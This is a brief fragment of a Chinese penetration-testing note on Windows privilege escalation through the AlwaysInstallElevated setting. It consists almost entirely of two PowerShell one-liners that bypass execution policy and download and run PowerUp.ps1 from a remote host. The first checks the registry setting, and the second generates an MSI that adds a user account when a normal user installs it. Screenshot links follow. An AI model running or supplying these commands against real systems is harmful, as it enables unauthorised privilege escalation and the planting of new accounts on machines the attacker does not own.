	>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1');Get-RegAlwaysInstallElevated"
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/157.png)

	>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1'); Write-UserAddMSI"
	普通用户执行安装
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/158.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/159.png)
